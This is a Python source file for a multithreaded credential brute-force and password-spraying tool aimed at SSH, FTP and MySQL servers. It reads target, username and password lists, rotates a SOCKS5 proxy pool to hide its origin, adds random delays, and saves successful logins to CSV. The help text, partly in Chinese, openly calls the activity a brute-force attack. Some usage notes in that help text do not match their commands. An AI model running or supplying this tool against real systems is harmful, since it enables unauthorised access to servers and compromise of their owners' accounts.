#!/usr/bin/env python3
# brute_force.py
# v3.2 - Unique log filename (per run) + Proxy Pool + Check IP on success or first failure

import argparse
import paramiko
import mysql.connector
from mysql.connector import errors as mysql_errors
import ftplib
import logging
import csv
import random
import socket
import socks
import requests  # 用來查 IP
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from threading import Lock
import time
import os

# ------------------------------- #
# Logging Configuration
# ------------------------------- #

LOG_DIR = "brute_logs"
os.makedirs(LOG_DIR, exist_ok=True)

timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
log_filename = os.path.join(LOG_DIR, f"brute_force_{timestamp_str}.log")

class TqdmLoggingHandler(logging.Handler):
    """Custom logging handler compatible with tqdm."""
    def emit(self, record):
        msg = self.format(record)
        tqdm.write(msg)


def setup_logging(retention_days):
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = []

    console_handler = TqdmLoggingHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

    file_handler = logging.FileHandler(log_filename, encoding='utf-8')
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(file_handler)

    cleanup_old_logs(retention_days)

def cleanup_old_logs(retention_days):
    now = datetime.now()
    for filename in os.listdir(LOG_DIR):
        file_path = os.path.join(LOG_DIR, filename)
        if os.path.isfile(file_path):
            try:
                parts = filename.split("_")
                if len(parts) >= 3:
                    file_date_str = parts[2]
                    file_date = datetime.strptime(file_date_str, "%Y%m%d")
                    if (now - file_date).days > retention_days:
                        os.remove(file_path)
                        logging.info(f"🗑️ Deleted expired log file: {filename}")
            except Exception as e:
                logging.warning(f"⚠️ Unable to process log file {filename}: {e}")

# ------------------------------- #
# Globals
# ------------------------------- #

output_file_lock = Lock()
PROXY_POOL = []

# ------------------------------- #
# Utility Functions
# ------------------------------- #

def create_socks_socket(proxy_str, timeout=10):
    if not proxy_str:
        return None
    try:
        if proxy_str.lower().startswith('socks5://'):
            url = urlparse(proxy_str.strip())
            host, port = url.hostname, url.port
            user, pwd = url.username, url.password
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, host, port, username=user, password=pwd)
            s.settimeout(timeout)
            return s
        else:
            host, port = proxy_str.split(':')
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, host, int(port))
            s.settimeout(timeout)
            return s
    except Exception as e:
        logging.warning(f"⚠️ 無法解析代理: {proxy_str}, 錯誤: {e}")
        return None

def get_random_proxy():
    return random.choice(PROXY_POOL) if PROXY_POOL else None

def check_proxy_ip(proxy_str, timeout=10):
    proxy_url = proxy_str if proxy_str.lower().startswith("socks5://") else f"socks5://{proxy_str}"
    try:
        resp = requests.get("https://api.ipify.org?format=text",
                            proxies={"http": proxy_url, "https": proxy_url},
                            timeout=timeout)
        if resp.status_code == 200:
            return resp.text.strip()
    except:
        pass
    return None

# ------------------------------- #
# Login Attempts
# ------------------------------- #

def attempt_ssh_login(host, port, username, password, timeout=10, proxy=None):
    try:
        socket.gethostbyname(host)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if proxy:
            sock = create_socks_socket(proxy, timeout)
            if sock:
                sock.connect((host, port))
                client.connect(hostname=host, port=port,
                               username=username, password=password,
                               sock=sock, timeout=timeout)
            else:
                client.connect(host, port=port, username=username,
                               password=password, timeout=timeout)
        else:
            client.connect(host, port=port, username=username,
                           password=password, timeout=timeout)
        return True, "SSH Login successful"
    except paramiko.AuthenticationException:
        return False, "Authentication failed"
    except paramiko.SSHException as e:
        return False, f"SSHException: {e}"
    except (socket.gaierror, socket.timeout):
        return False, "timed out"
    except Exception as e:
        return False, f"Unexpected error: {e}"
    finally:
        if 'client' in locals():
            client.close()

from urllib.parse import urlparse

def attempt_ftp_login(host, port, username, password, timeout=10, proxy=None):
    try:
        socket.gethostbyname(host)
        ftp = ftplib.FTP()

        if proxy:
            # 解析 proxy 字串
            url = urlparse(proxy)
            socks.set_default_proxy(
                socks.SOCKS5,
                addr=url.hostname,
                port=url.port,
                username=url.username,
                password=url.password
            )
            # 替换全局 socket
            socket.socket = socks.socksocket
            try:
                ftp.connect(host, port, timeout=timeout)
            finally:
                # 恢复
                socket.socket = original_socket
                socks.set_default_proxy(None)
        else:
            ftp.connect(host, port, timeout=timeout)

        ftp.login(username, password)
        ftp.quit()
        return True, "FTP Login successful"
    except ftplib.error_perm:
        return False, "Authentication failed"
    except (socket.gaierror, socket.timeout):
        return False, "timed out"
    except Exception as e:
        return False, f"Unexpected error: {e}"

original_socket = socket.socket
proxy_lock = Lock()

def attempt_mysql_login(host, port, username, password, timeout=10, proxy=None):
    try:
        socket.gethostbyname(host)

        if proxy:
            # 直接 parse proxy_str，避免從 socket 取內部屬性
            url = urlparse(proxy)
            proxy_host, proxy_port = url.hostname, url.port
            proxy_user, proxy_pwd   = url.username, url.password

            # 設定全域 default proxy
            socks.set_default_proxy(
                socks.SOCKS5,
                addr=proxy_host,
                port=proxy_port,
                username=proxy_user,
                password=proxy_pwd
            )
            socket.socket = socks.socksocket

            try:
                conn = mysql.connector.connect(
                    host=host, port=port,
                    user=username, password=password,
                    connection_timeout=timeout
                )
            finally:
                # 恢復原生 socket
                socket.socket = original_socket
                socks.set_default_proxy(None)

        else:
            conn = mysql.connector.connect(
                host=host, port=port,
                user=username, password=password,
                connection_timeout=timeout
            )

        conn.close()
        return True, "MySQL Login successful"
    except mysql_errors.ProgrammingError as e:
        if "Access denied" in str(e):
            return False, "Authentication failed"
        return False, f"MySQL error: {e}"
    except mysql_errors.InterfaceError as e:
        return False, f"Connection error: {e}"
    except (socket.gaierror, socket.timeout):
        return False, "timed out"
    except Exception as e:
        return False, f"Unexpected error: {e}"

# ------------------------------- #
# File I/O
# ------------------------------- #

def write_result(file_path, data, headers):
    with output_file_lock:
        with open(file_path, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=headers)
            if f.tell() == 0:
                writer.writeheader()
            writer.writerow(data)

def read_failed_log(file_path):
    if not os.path.isfile(file_path):
        logging.error(f"🚫 Failed log file '{file_path}' not found.")
        return []
    with open(file_path, newline='', encoding='utf-8') as f:
        return list(csv.DictReader(f))

# ------------------------------- #
# Core Processing
# ------------------------------- #

def process_login(service, username, password, host, port,
                  output_file, failed_log,
                  timeout, retry_attempts, min_delay, max_delay):
    chosen_proxy = get_random_proxy()
    logging.info(f"🔍 Testing target: {host} with password: {password} (Proxy: {chosen_proxy or 'None'})")

    for attempt in range(1, retry_attempts + 1):
        if service == "ssh":
            success, reason = attempt_ssh_login(host, port, username, password, timeout, proxy=chosen_proxy)
        elif service == "ftp":
            success, reason = attempt_ftp_login(host, port, username, password, timeout, proxy=chosen_proxy)
        elif service == "mysql":
            success, reason = attempt_mysql_login(host, port, username, password, timeout, proxy=chosen_proxy)
        else:
            logging.error(f"🚫 Unsupported service: {service}")
            return

        result_data = {
            "Service": service,
            "Host": host,
            "Port": port,
            "Username": username,
            "Password": password
        }

        if success:
            if chosen_proxy:
                proxy_ip = check_proxy_ip(chosen_proxy, timeout=timeout)
                if proxy_ip:
                    logging.info(f"✅ [{service.upper()}] Proxy {chosen_proxy} => 外部 IP: {proxy_ip}")
                else:
                    logging.warning(f"⚠️ 無法透過代理 {chosen_proxy} 取得外部 IP (成功連線但 ipify fail?)")
            write_result(output_file, result_data, ["Service","Host","Port","Username","Password"])
            logging.info(f"✅ Success - {service.upper()} {host}:{port} | {username}:{password}")
            break

        else:
            # 第一次失敗也查 IP
            if attempt == 1 and chosen_proxy:
                proxy_ip = check_proxy_ip(chosen_proxy, timeout=timeout)
                if proxy_ip:
                    logging.info(f"❌(1st) [{service.upper()}] Proxy {chosen_proxy} => 外部 IP: {proxy_ip}")
                else:
                    logging.warning(f"⚠️ (1st) 無法透過代理 {chosen_proxy} 取得外部 IP")

            # 優化過的 reason_msg
            reason_msg = reason
            if 'timed out' in reason.lower():
                reason_msg = f"Connection timed out after {timeout}s (no response from host)"

            logging.warning(
                f"❌ Failed ({attempt}/{retry_attempts}) - {service.upper()} {host}:{port} | "
                f"{username}:{password} | Reason: {reason_msg}"
            )

            if failed_log and reason.lower() != "authentication failed":
                result_data["Reason"] = reason_msg
                write_result(failed_log, result_data,
                             ["Service","Host","Port","Username","Password","Reason"])

            if attempt < retry_attempts:
                delay = random.uniform(min_delay, max_delay)
                logging.info(f"🔄 Retrying after {delay:.2f}s...")
                time.sleep(delay)

def retry_failed_log(failed_log_file, output_file, save_failed_log,
                     timeout, retry_attempts, min_delay, max_delay, threads):
    failed_entries = read_failed_log(failed_log_file)
    if not failed_entries:
        logging.info("✅ No failed entries found to retry.")
        return

    logging.info(f"🔄 Retrying {len(failed_entries)} failed attempts from '{failed_log_file}'...")
    with tqdm(total=len(failed_entries), desc="🔄 重試進度", unit="記錄", leave=True) as bar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(
                    process_login,
                    entry['Service'], entry['Username'], entry['Password'],
                    entry['Host'], int(entry['Port']),
                    output_file, save_failed_log,
                    timeout, retry_attempts, min_delay, max_delay
                ) for entry in failed_entries
            ]
            for fut in as_completed(futures):
                fut.result()
                bar.update(1)

# ------------------------------- #
# Entry Point
# ------------------------------- #

def main():
    parser = argparse.ArgumentParser(
        description='🔑 Brute Force Tool',
        epilog="""

Usage Examples:
  🔑 一般模式 (針對 SSH 目標進行密碼噴灑):
    python brute_force.py --service ssh --target_list targets.txt --username admin --password_list passwords.txt --output success.csv
    - 使用指定的 target、username 及密碼列表執行 Basic Auth 登入測試。

  🔑 使用自訂埠與多執行緒:
    python brute_force.py --service ftp --target_list targets.txt --username user --password_list passwords.txt --port 2121 --threads 10 --output success.csv
    - 從先前失敗的記錄 (previous_failed.csv) 中重新發起測試，
      並將本次仍失敗的嘗試記錄至 failed_attempts.csv。

  🔄 從失敗紀錄檔中重試:
    python brute_force.py --retry_failed failed_log.csv --output success_retry.csv --threads 5 --retry_attempts 3
    - 利用之前 Basic Auth 測試的結果 (basic_auth_results.csv) 對 phpMyAdmin 進行測試，
      須先進行 Basic Auth 測試並保存結果。

  📌 代理池模式:
    python brute_force.py --service ssh --target_list targets.txt --username admin --password_list passwords.txt --output success.csv --proxy_list proxies.txt
    - 使用代理池執行爆破攻擊。


Parameters:
  --target_list      檔案路徑，包含每行一個目標 (例如：192.168.1.1 或 example.com)。
  --username         指定用來測試的帳號；或使用 --username_list 提供多個帳號檔案。
  --password_list    檔案路徑，包含每行一個密碼。
  --service          選擇目標服務，選項包括：ssh, ftp, mysql。
  --output           成功登入結果輸出至 CSV 檔案。
  --failed_log       (可選) 記錄本次測試失敗嘗試的 CSV 檔案路徑。
  --retry_failed     (可選) 指定先前失敗記錄 CSV 檔案，啟動重試模式。

  
Additional Options:
  --threads             同時執行的線程數 (預設: 5)。
  --timeout             請求逾時秒數 (預設: 10)。
  --retry_attempts      每組憑證的重試次數 (預設: 1)。
  --port                目標服務埠號 (預設: 80)。
  --log_retention_days  記錄檔保留天數 (預設: 7)。
  --min_delay           每次嘗試前的**最小**延遲時間 (秒)，與 --max_delay 配合使用 (預設: 1.0)。
  --max_delay           每次嘗試前的**最大**延遲時間 (秒)，與 --min_delay 配合使用 (預設: 1.0)。
  --proxy               單一代理 (http:// 或 socks5:// 格式)。
  --proxy_list          代理池文字檔 (一行一個代理)。

""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--service',      choices=['ssh','ftp','mysql'], required=True)
    parser.add_argument('--target_list',  help='file with one target per line')
    parser.add_argument('--username',     help='username to attempt')
    parser.add_argument('--username_list', help='file with one username per line')
    parser.add_argument('--password_list',help='file with one password per line')
    parser.add_argument('--output',       required=True, help='success CSV')
    parser.add_argument('--failed_log',   help='(optional) failed-attempt CSV')
    parser.add_argument('--retry_failed', metavar='FAILED_LOG_FILE',
                        help='retry from given failed-log CSV')
    parser.add_argument('--proxy_list',   help='(optional) file of SOCKS5 proxies')
    parser.add_argument('--port',         type=int, help='override default port')
    parser.add_argument('--threads',      type=int, default=5)
    parser.add_argument('--timeout',      type=int, default=10)
    parser.add_argument('--retry_attempts',type=int, default=1)
    parser.add_argument('--min_delay',    type=float, default=1.0)
    parser.add_argument('--max_delay',    type=float, default=1.0)
    parser.add_argument('--log_retention_days', type=int, default=7)

    args = parser.parse_args()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # ——————— 生成唯一 failed_log 路径 ———————
    if args.failed_log:
        # 若只给了文件名，就用脚本所在目录
        provided_dir = os.path.dirname(args.failed_log)
        dir_name = provided_dir if provided_dir else script_dir
        base = os.path.basename(args.failed_log)
        name, ext = os.path.splitext(base)
        ext = ext if ext else '.csv'
        failed_log_path = os.path.join(dir_name, f"{name}_{timestamp_str}{ext}")
    else:
        failed_log_path = os.path.join(script_dir, f"failed_{timestamp_str}.csv")

    setup_logging(args.log_retention_days)

    global PROXY_POOL
    if args.proxy_list and os.path.isfile(args.proxy_list):
        with open(args.proxy_list,'r',encoding='utf-8') as pf:
            PROXY_POOL = [p.strip() for p in pf if p.strip()]
        logging.info(f"🌐 已載入代理 {len(PROXY_POOL)} 個。")

    if args.retry_failed:
        retry_failed_log(
            failed_log_file=args.retry_failed,
            output_file=args.output,
            save_failed_log=failed_log_path,
            timeout=args.timeout,
            retry_attempts=args.retry_attempts,
            min_delay=args.min_delay,
            max_delay=args.max_delay,
            threads=args.threads
        )
        return


    if not args.service or not args.target_list or not args.password_list:
        logging.error("🚫 Missing required arguments for normal mode.")
        return
    
    # 確保至少有 username 或 username_list 其中之一
    if not args.username and not args.username_list:
        logging.error("🚫 Must provide either --username or --username_list.")
        return

    default_ports = {'ssh':22,'ftp':21,'mysql':3306}
    port = args.port or default_ports[args.service]

    with open(args.target_list)    as f: targets   = [l.strip() for l in f if l.strip()]
    with open(args.password_list)  as f: passwords = [l.strip() for l in f if l.strip()]

    # -------- 新增：從 --username 或 --username_list 讀取帳號 --------
    usernames = []
    if args.username:
        usernames = [args.username]
    elif args.username_list and os.path.isfile(args.username_list):
        with open(args.username_list, 'r', encoding='utf-8') as uf:
            usernames = [l.strip() for l in uf if l.strip()]
    else:
        logging.error("🚫 No valid username(s) provided.")
        return
    # ---------------------------------------------------------------


    # 計算總任務數：帳號數 × 密碼數
    total_tasks = len(usernames) * len(passwords)
    with tqdm(total=total_tasks, desc="🔑 爆破進度", unit="組", leave=True) as bar:
        for pwd in passwords:
            random.shuffle(targets)  # 🆕 亂數排列 targets 每組密碼都不同順序
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = [
                    executor.submit(
                        process_login,
                        args.service, user, pwd,
                        host, port,
                        args.output, failed_log_path,
                        args.timeout, args.retry_attempts,
                        args.min_delay, args.max_delay
                    ) for user in usernames for host in targets
                ]
                for fut in as_completed(futures):
                    try:
                        fut.result()
                    except Exception as e:
                        logging.error(f"🔴 Task error: {e}")
                    bar.update(1)

    logging.info("✅ 所有密碼測試完成。")

if __name__ == "__main__":
    main()


